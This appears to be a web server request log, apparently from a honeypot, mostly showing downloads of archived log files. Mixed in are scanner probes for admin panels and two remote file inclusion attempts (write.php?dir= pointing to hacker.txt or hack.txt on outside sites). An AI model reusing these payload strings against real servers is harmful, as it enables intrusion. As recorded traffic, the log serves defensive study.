47,1,301,0,GET /self.logs/error.log.2015-10-28.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-25.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-17.gz HTTP/1.1
50,1,404,1,GET /honeypot/BSidesDFW%20-%202014.ipynb' HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-26.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-20.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-25.gz HTTP/1.1
36,1,200,1,GET /self.logs/?C=N%3BO%3DD HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-08.gz HTTP/1.1
120,1,404,1,GET /honeypot//write.php?dir=http://www.kennyagrisoft.com//wp-content/themes/DynamiX/lib/scripts/hacker.txt???? HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-19.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-03.gz HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-06-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-09.gz HTTP/1.1
25,1,404,0,GET /phpmyadmin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-04.gz HTTP/1.1
19,1,404,0,GET /admin HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-24.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-23.gz HTTP/1.1
32,1,404,0,HEAD /pe_static/ap1.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-14.gz HTTP/1.1
39,1,200,0,GET /bootstrap/img/favicon.ico HTTP/1.0
39,1,200,0,GET /bootstrap/img/favicon.ico HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-29.gz HTTP/1.1
116,1,404,1,GET /honeypot//write.php?dir=http://www.ostinato.be//components/com_avreloaded/views/popup/tmpl/hack.txt??? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-19.gz HTTP/1.1
43,1,404,1,GET /honeypot/Honeypot+-+Howto.pdf HTTP/1.0
48,1,404,0,GET /self.logs/access.log.2016-02-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-15.gz HTTP/1.1
48,1,301,0,GET /admin/index.php?route=common/login HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-17.gz HTTP/1.1
26,1,200,0,HEAD /favicon.ico HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-05.gz HTTP/1.1
27,1,301,0,GET /old/wp-admin/ HTTP/1.1
20,1,200,0,GET /squid/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-12.gz HTTP/1.1
36,1,404,0,HEAD /pub/errors/design.xml HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-16.gz HTTP/1.1
